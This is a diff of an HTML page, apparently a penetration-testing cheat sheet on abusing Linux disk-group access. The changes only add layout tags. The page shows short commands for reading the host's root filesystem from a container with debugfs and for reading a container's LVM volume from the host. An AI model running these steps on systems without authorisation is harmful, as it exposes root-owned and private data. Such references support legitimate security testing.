@@ -200,6 +200,7 @@
 
 <div class="content"><hr>
 <h3 id="basic">Basic</h3>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Show devices</span>
 </span></span><span class="line"><span class="cl">lsblk
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Device attributes</span>
@@ -208,12 +209,20 @@
 </span></span><span class="line"><span class="cl">swapon -s
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Filesystem info</span>
 </span></span><span class="line"><span class="cl">cat /etc/fstab
-</span></span></code></pre></div><h3 id="abuse-1-read-hosts-filesystem-from-container-root">Abuse #1: Read host&rsquo;s filesystem from container (root)</h3>
+</span></span></code></pre></div></div>
+<br>
+<hr>
+<h3 id="abuse-1-read-hosts-filesystem-from-container-root">Abuse #1: Read host&rsquo;s filesystem from container (root)</h3>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Open target device</span>
 </span></span><span class="line"><span class="cl">debugfs /dev/sda1
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Exploit</span>
 </span></span><span class="line"><span class="cl">ls /root
-</span></span></code></pre></div><h3 id="abuse-2-read-containers-filesystem-from-host">Abuse #2: Read container&rsquo;s filesystem from host</h3>
+</span></span></code></pre></div></div>
+<br>
+<hr>
+<h3 id="abuse-2-read-containers-filesystem-from-host">Abuse #2: Read container&rsquo;s filesystem from host</h3>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Show LVM mappings</span>
 </span></span><span class="line"><span class="cl">ls -l /dev/mapper/
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># In our local machine</span>
@@ -227,7 +236,8 @@
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Privilege read</span>
 </span></span><span class="line"><span class="cl">ls /mnt/root/
 </span></span></code></pre></div><p><small><em>Note: can take a long time to transfer</em></small></p>
-</div></div>
+</div>
+<br></div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
